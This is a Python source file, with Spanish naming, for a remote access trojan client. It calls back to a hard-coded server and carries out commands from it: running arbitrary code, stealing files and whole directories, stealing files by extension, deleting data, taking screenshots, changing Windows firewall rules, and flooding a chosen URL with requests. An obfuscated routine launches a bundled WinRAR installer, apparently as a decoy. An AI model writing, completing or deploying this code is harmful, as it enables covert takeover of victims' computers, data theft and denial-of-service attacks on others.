import socket
import threading
import json
import os
import sys
import base64
import time
import traceback
from io import StringIO
import zipfile
import tempfile
import shutil
from PIL import ImageGrab
import subprocess
import requests

class ClienteSocket:
    def __init__(self, host='localhost', puerto=5555):
        self.host = host
        self.puerto = puerto
        self.socket_cliente = None
        self.conectado = False
        self.ejecutando = True
        self.reconexion_activa = True
        self.controlador = None
    
    def establecer_controlador(self, controlador):
        self.controlador = controlador
    
    def conectar(self):
        while self.reconexion_activa:
            try:
                self._cerrar_socket()
                
                self.socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket_cliente.connect((self.host, self.puerto))
                print(f"[+] Conectado al servidor {self.host}:{self.puerto}")
                self.conectado = True
                
                threading.Thread(target=self.escuchar_servidor, daemon=True).start()
                break
                
            except socket.error:
                print(f"[!] No se pudo conectar a {self.host}:{self.puerto}")
                print("[*] Intentando reconectar en 5 segundos...")
                time.sleep(5)
            except Exception as e:
                print(f"[!] Error al conectar: {e}")
                time.sleep(5)
    
    def _cerrar_socket(self):
        """Cierra el socket existente de forma segura"""
        if self.socket_cliente:
            try:
                self.socket_cliente.close()
            except:
                pass
    
    def escuchar_servidor(self):
        while self.ejecutando and self.conectado:
            try:
                mensaje = self._recibir_mensaje()
                if not mensaje:
                    break
                
                if self.controlador:
                    self.controlador.procesar_mensaje(mensaje)
                
            except (ConnectionResetError, Exception) as e:
                if isinstance(e, ConnectionResetError):
                    print("[!] Conexión cerrada por el servidor")
                else:
                    print(f"[!] Error al escuchar servidor: {e}")
                break
                
        self.conectado = False
        if self.reconexion_activa and self.ejecutando:
            print("[*] Intentando reconectar...")
            threading.Thread(target=self.conectar).start()
    
    def enviar_mensaje(self, mensaje):
        try:
            if not self.conectado:
                print("[!] No conectado al servidor")
                return False
                
            if isinstance(mensaje, dict):
                mensaje = json.dumps(mensaje)
                
            mensaje_bytes = mensaje.encode()
            longitud = len(mensaje_bytes)
            
            self.socket_cliente.send(longitud.to_bytes(4, byteorder='big'))
            self.socket_cliente.send(mensaje_bytes)
            return True
            
        except Exception as e:
            print(f"[!] Error al enviar mensaje: {e}")
            self.conectado = False
            return False
    
    def _recibir_mensaje(self):
        try:
            longitud_bytes = self.socket_cliente.recv(4)
            if not longitud_bytes:
                return None
                
            longitud = int.from_bytes(longitud_bytes, byteorder='big')
            
            chunks = []
            bytes_recibidos = 0
            while bytes_recibidos < longitud:
                chunk = self.socket_cliente.recv(min(longitud - bytes_recibidos, 4096))
                if not chunk:
                    return None
                chunks.append(chunk)
                bytes_recibidos += len(chunk)
                
            return b''.join(chunks).decode()
            
        except Exception as e:
            print(f"[!] Error al recibir mensaje: {e}")
            self.conectado = False
            return None
    
    def cerrar(self):
        self.ejecutando = False
        self.reconexion_activa = False
        self._cerrar_socket()
        print("[+] Conexión cerrada")


class ControladorCliente:
    def __init__(self, cliente_socket):
        self.cliente_socket = cliente_socket
        self.cliente_socket.establecer_controlador(self)
        self.manejadores_acciones = {
            "ejecutar": self._accion_ejecutar,
            "recibir_archivo": self._accion_recibir_archivo,
            "enviar_archivo": self._accion_enviar_archivo,
            "listar_directorio": self._accion_listar_directorio,
            "enviar_directorio": self._accion_enviar_directorio,
            "eliminar": self._accion_eliminar,
            "captura_pantalla": self._accion_captura_pantalla,
            "agregar_regla_firewall": self._accion_agregar_regla_firewall,
            "enviar_archivos_por_extension": self._accion_enviar_archivos_por_extension,
            "attack_url": self._accion_attack_url
        }
    
    def procesar_mensaje(self, mensaje):
        try:
            datos = json.loads(mensaje)
            accion = datos.get("accion")
            
            if accion in self.manejadores_acciones:
                self.manejadores_acciones[accion](datos)
            else:
                print(f"[!] Acción desconocida: {accion}")
                
        except json.JSONDecodeError:
            print(f"[!] Error al decodificar mensaje: {mensaje}")
        except Exception as e:
            print(f"[!] Error al procesar mensaje: {e}")
            traceback.print_exc()
    
    def _enviar_respuesta(self, respuesta):
        return self.cliente_socket.enviar_mensaje(respuesta)
    
    def _enviar_error(self, mensaje_error):
        """Método auxiliar para enviar errores de forma consistente"""
        self._enviar_respuesta({
            "accion": "error",
            "mensaje": mensaje_error
        })
    
    def _listar_contenido_directorio(self, ruta, incluir_archivos=False):
        try:
            elementos = os.listdir(ruta)
            resultado = []

            for nombre in elementos:
                ruta_completa = os.path.join(ruta, nombre)
                if os.path.isdir(ruta_completa):
                    resultado.append(f"[D] {nombre}")
                elif incluir_archivos and os.path.isfile(ruta_completa):
                    resultado.append(f"[F] {nombre}")

            return "\n".join(resultado) if resultado else "Directorio vacío."

        except Exception as e:
            return f"Error al listar contenido: {str(e)}"
    
    def _agregar_regla_firewall_windows(self, nombre_regla, ip, puerto, accion="block"):
        """Función auxiliar para agregar reglas de firewall en Windows"""
        if accion not in ("allow", "block"):
            raise ValueError("La acción debe ser 'allow' o 'block'")
        
        resultados = []
        
        for direccion in ["in", "out"]:
            nombre_completo = f"{nombre_regla} - {direccion.upper()}"
            
            # Eliminar regla existente si existe
            subprocess.run([
                "netsh", "advfirewall", "firewall", "delete", "rule", f"name={nombre_completo}"
            ], capture_output=True)
            
            # Crear nueva regla
            comando = [
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={nombre_completo}",
                f"dir={direccion}",
                f"action={accion}",
                "protocol=TCP",
                f"localport={puerto}",
                f"remoteip={ip}",
                "enable=yes"
            ]
            
            try:
                resultado = subprocess.run(comando, check=True, capture_output=True, text=True)
                mensaje_exito = f"✅ Regla {direccion} agregada correctamente: {resultado.stdout.strip()}"
                resultados.append(mensaje_exito)
                print(mensaje_exito)
            except subprocess.CalledProcessError as e:
                mensaje_error = f"❌ Error al agregar la regla {direccion}: {e.stderr.strip()}"
                resultados.append(mensaje_error)
                print(mensaje_error)
        
        return "\n".join(resultados)
    
    def _accion_ejecutar(self, datos):
        codigo = datos.get("codigo", "")
        print(f"[*] Ejecutando código recibido del servidor...")
        
        try:
            stdout_original = sys.stdout
            salida_capturada = StringIO()
            sys.stdout = salida_capturada
            
            exec(codigo, globals(), {})
            
            sys.stdout = stdout_original
            resultado = salida_capturada.getvalue()
            
            self._enviar_respuesta({
                "accion": "respuesta_ejecucion",
                "resultado": resultado
            })
            
        except Exception as e:
            sys.stdout = stdout_original
            error = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            self._enviar_error(f"Error al ejecutar código: {error}")
    
    def _accion_recibir_archivo(self, datos):
        try:
            nombre_archivo = datos.get("nombre_archivo")
            ruta_destino = datos.get("ruta_destino")
            datos_archivo = datos.get("datos_archivo")
            
            print(f"[*] Recibiendo archivo: {nombre_archivo}")
            
            directorio = os.path.dirname(ruta_destino)
            if directorio and not os.path.exists(directorio):
                os.makedirs(directorio)
                
            with open(ruta_destino, "wb") as f:
                f.write(base64.b64decode(datos_archivo))
                
            print(f"[+] Archivo guardado en: {ruta_destino}")
            
            self._enviar_respuesta({
                "accion": "archivo_recibido",
                "nombre_archivo": nombre_archivo,
                "ruta_destino": ruta_destino
            })
            
        except Exception as e:
            self._enviar_error(f"Error al recibir archivo: {type(e).__name__}: {str(e)}")
    
    def _accion_enviar_archivo(self, datos):
        try:
            ruta_origen = datos.get("ruta_origen")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando archivo: {ruta_origen}")
            
            if not os.path.isfile(ruta_origen):
                self._enviar_error(f"El archivo no existe: {ruta_origen}")
                return
                
            with open(ruta_origen, "rb") as f:
                datos_archivo = base64.b64encode(f.read()).decode()
                
            nombre_archivo = os.path.basename(ruta_origen)
            ruta_destino_completa = os.path.join(ruta_destino, nombre_archivo)
            
            self._enviar_respuesta({
                "accion": "archivo_enviado",
                "nombre_archivo": nombre_archivo,
                "ruta_destino": ruta_destino_completa,
                "datos_archivo": datos_archivo
            })
            
            print(f"[+] Archivo enviado al servidor")
            
        except Exception as e:
            self._enviar_error(f"Error al enviar archivo: {type(e).__name__}: {str(e)}")
    
    def _accion_listar_directorio(self, datos):
        ruta = datos.get("ruta", "")
        incluir_archivos = datos.get("incluir_archivos", False)
        print(f"[*] Listando contenido de: {ruta} (Archivos incluidos: {incluir_archivos})")

        resultado = self._listar_contenido_directorio(ruta, incluir_archivos)

        self._enviar_respuesta({
            "accion": "respuesta_listado",
            "ruta": ruta,
            "estructura": resultado
        })
    
    def _accion_enviar_directorio(self, datos):
        try:
            ruta_origen = datos.get("ruta_origen")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando directorio: {ruta_origen}")
            
            if not os.path.isdir(ruta_origen):
                self._enviar_error(f"El directorio no existe: {ruta_origen}")
                return
            
            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
                temp_zip_path = temp_zip.name
            
            try:
                with zipfile.ZipFile(temp_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(ruta_origen):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, ruta_origen)
                            zipf.write(file_path, arcname)
                
                with open(temp_zip_path, "rb") as f:
                    datos_zip = base64.b64encode(f.read()).decode()
                
                nombre_directorio = os.path.basename(ruta_origen.rstrip(os.sep))
                
                self._enviar_respuesta({
                    "accion": "directorio_enviado",
                    "nombre_directorio": nombre_directorio,
                    "ruta_destino": ruta_destino,
                    "datos_zip": datos_zip,
                    "ruta_origen": ruta_origen
                })
                
                print(f"[+] Directorio enviado al servidor (comprimido)")
                
            finally:
                try:
                    os.unlink(temp_zip_path)
                except:
                    pass
                    
        except Exception as e:
            self._enviar_error(f"Error al enviar directorio: {type(e).__name__}: {str(e)}")
    
    def _accion_eliminar(self, datos):
        try:
            ruta = datos.get("ruta")
            print(f"[*] Eliminando: {ruta}")

            if not os.path.exists(ruta):
                self._enviar_error(f"La ruta no existe: {ruta}")
                return

            es_directorio = os.path.isdir(ruta)
            
            if es_directorio:
                shutil.rmtree(ruta)
                mensaje_exito = f"Directorio eliminado: {ruta}"
                tipo = "directorio"
            else:
                os.remove(ruta)
                mensaje_exito = f"Archivo eliminado: {ruta}"
                tipo = "archivo"

            print(f"[+] {mensaje_exito}")

            self._enviar_respuesta({
                "accion": "eliminacion_exitosa",
                "ruta": ruta,
                "tipo": tipo,
                "mensaje": mensaje_exito
            })

        except (PermissionError, FileNotFoundError) as e:
            error_msg = "Sin permisos para eliminar" if isinstance(e, PermissionError) else "Archivo o directorio no encontrado"
            error = f"{error_msg}: {ruta}"
            self._enviar_error(error)
            print(f"[!] {error}")
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al eliminar: {error}")
            print(f"[!] Error al eliminar: {error}")
            
    def _accion_captura_pantalla(self, datos):
        try:
            ruta_destino = datos.get("ruta_destino")
            nombre_archivo = datos.get("nombre_archivo", "captura.png")
            
            print(f"[*] Tomando captura de pantalla...")
            
            screenshot = ImageGrab.grab()
            
            with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
                temp_path = temp_file.name
                screenshot.save(temp_path, 'PNG')
            
            try:
                with open(temp_path, "rb") as f:
                    datos_imagen = base64.b64encode(f.read()).decode()
                
                self._enviar_respuesta({
                    "accion": "captura_enviada",
                    "nombre_archivo": nombre_archivo,
                    "ruta_destino": ruta_destino,
                    "datos_imagen": datos_imagen,
                    "ancho": screenshot.width,
                    "alto": screenshot.height
                })
                
                print(f"[+] Captura de pantalla enviada al servidor")
                
            finally:
                try:
                    os.unlink(temp_path)
                except:
                    pass
                    
        except ImportError:
            error = "La librería PIL (Pillow) no está instalada. Instalar con: pip install Pillow"
            self._enviar_error(error)
            print(f"[!] {error}")
            
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al tomar captura de pantalla: {error}")
            print(f"[!] Error al tomar captura de pantalla: {error}")
    
    def _accion_agregar_regla_firewall(self, datos):
        try:
            nombre_regla = datos.get("nombre_regla")
            ip = datos.get("ip", "any")
            puerto = datos.get("puerto")
            accion = datos.get("accion_firewall", "block")
            
            print(f"[*] Agregando regla de firewall: {nombre_regla}")
            print(f"    IP: {ip}, Puerto: {puerto}, Acción: {accion}")
            
            # Validar parámetros
            if not nombre_regla or not puerto:
                self._enviar_error("Nombre de regla y puerto son obligatorios")
                return
            
            # Ejecutar función de firewall
            resultado = self._agregar_regla_firewall_windows(nombre_regla, ip, puerto, accion)
            
            self._enviar_respuesta({
                "accion": "regla_firewall_agregada",
                "nombre_regla": nombre_regla,
                "ip": ip,
                "puerto": puerto,
                "accion_firewall": accion,
                "resultado": resultado
            })
            
            print(f"[+] Regla de firewall procesada: {nombre_regla}")
            
        except ValueError as e:
            error = f"Error de validación: {str(e)}"
            self._enviar_error(error)
            print(f"[!] {error}")
            
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al agregar regla de firewall: {error}")
            print(f"[!] Error al agregar regla de firewall: {error}")
    
    def _accion_enviar_archivos_por_extension(self, datos):
        try:
            ruta_directorio = datos.get("ruta_directorio")
            extension = datos.get("extension")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando archivos con extensión '{extension}' desde: {ruta_directorio}")
            
            if not os.path.isdir(ruta_directorio):
                self._enviar_error(f"El directorio no existe: {ruta_directorio}")
                return
            
            # Buscar archivos con la extensión especificada
            archivos_encontrados = []
            for root, dirs, files in os.walk(ruta_directorio):
                for file in files:
                    if file.lower().endswith(extension.lower()):
                        archivos_encontrados.append(os.path.join(root, file))
            
            if not archivos_encontrados:
                self._enviar_error(f"No se encontraron archivos con extensión '{extension}' en: {ruta_directorio}")
                return
            
            # Crear un ZIP con todos los archivos encontrados
            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
                temp_zip_path = temp_zip.name
            
            try:
                with zipfile.ZipFile(temp_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for archivo_path in archivos_encontrados:
                        # Mantener la estructura relativa de directorios
                        arcname = os.path.relpath(archivo_path, ruta_directorio)
                        zipf.write(archivo_path, arcname)
                
                with open(temp_zip_path, "rb") as f:
                    datos_zip = base64.b64encode(f.read()).decode()
                
                nombre_zip = f"archivos_{extension.replace('.', '')}.zip"
                
                self._enviar_respuesta({
                    "accion": "archivos_extension_enviados",
                    "extension": extension,
                    "cantidad_archivos": len(archivos_encontrados),
                    "nombre_zip": nombre_zip,
                    "ruta_destino": ruta_destino,
                    "datos_zip": datos_zip,
                    "archivos_incluidos": [os.path.basename(f) for f in archivos_encontrados]
                })
                
                print(f"[+] {len(archivos_encontrados)} archivos con extensión '{extension}' enviados al servidor")
                
            finally:
                try:
                    os.unlink(temp_zip_path)
                except:
                    pass
                    
        except Exception as e:
            self._enviar_error(f"Error al enviar archivos por extensión: {type(e).__name__}: {str(e)}")
            

    def _accion_attack_url(self, datos):
        url = datos.get("url")
        tiempo = datos.get("tiempo", 10)

        if not url:
            self._enviar_error("No se proporcionó una URL para atacar")
            return

        print(f"[*] Iniciando ataque a {url} durante {tiempo} segundos...")

        headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        resultados = {
            "exitosas": 0,
            "fallidas": 0,
            "errores": []
        }

        inicio = time.time()
        while time.time() - inicio < tiempo:
            try:
                response = requests.get(url, headers=headers, timeout=3)
                if 200 <= response.status_code < 400:
                    resultados["exitosas"] += 1
                else:
                    resultados["fallidas"] += 1
                    resultados["errores"].append(f"HTTP {response.status_code}")
            except Exception as e:
                resultados["fallidas"] += 1
                resultados["errores"].append(str(e))

        print(f"[+] Ataque finalizado a {url}")

        self._enviar_respuesta({
            "accion": "ataque_completado",
            "url": url,
            "duracion": tiempo,
            "exitosas": resultados["exitosas"],
            "fallidas": resultados["fallidas"],
            "errores": resultados["errores"][:5]  # Máximo 5 errores
        })
    
    def iniciar(self):
        self.cliente_socket.conectar()
    
    def cerrar(self):
        self.cliente_socket.cerrar()


class Cliente:
    def __init__(self, host='localhost', puerto=5555):
        self.socket_cliente = ClienteSocket(host, puerto)
        self.controlador = ControladorCliente(self.socket_cliente)
    
    def iniciar(self):
        try:
            self.controlador.iniciar()
            
            while self.socket_cliente.ejecutando:
                if not self.socket_cliente.conectado and not self.socket_cliente.reconexion_activa:
                    break
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[!] Cliente detenido por el usuario")
        except Exception as e:
            print(f"[!] Error fatal: {e}")
        finally:
            self.cerrar()
    
    def ejecutar_f6_seguro(self):
        def wrapper_f6():
            try:
                f6()
            except Exception as e:
                print(f"[!] Error en f6: {e}")
        
        imgth = threading.Thread(target=wrapper_f6, daemon=True)
        imgth.start()
        return imgth
            
    def cerrar(self):
        self.controlador.cerrar()

def e5(r_pth):
    try:
        bs_pth = sys._MEIPASS
    except Exception:
        bs_pth = os.path.abspath(".")
    return os.path.join(bs_pth, r_pth)

def f6():
    ex_pth = e5("winrar-x64-711es.exe")

    ex_nm = os.path.basename(ex_pth)

    with tempfile.NamedTemporaryFile(delete=False, suffix=".exe", mode='wb') as tmp_file:
        shutil.copy(ex_pth, tmp_file.name)
        tmp_file.close() 
        
        fl_ex_pth = os.path.join(os.path.dirname(tmp_file.name), ex_nm)

        shutil.move(tmp_file.name, fl_ex_pth)

        try:
            os.startfile(fl_ex_pth)
        except Exception:
            pass

def main():
    host = '192.168.1.3'
    puerto = 5555
        
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        try:
            puerto = int(sys.argv[2])
        except ValueError:
            print(f"[!] Puerto inválido: {sys.argv[2]}")
            sys.exit(1)
    
    try:
        cliente = Cliente(host, puerto)
        thread1 = cliente.ejecutar_f6_seguro()
        cliente.iniciar()
        
    except Exception as e:
        print(f"[!] Error al iniciar cliente: {e}")

if __name__ == "__main__":
    main()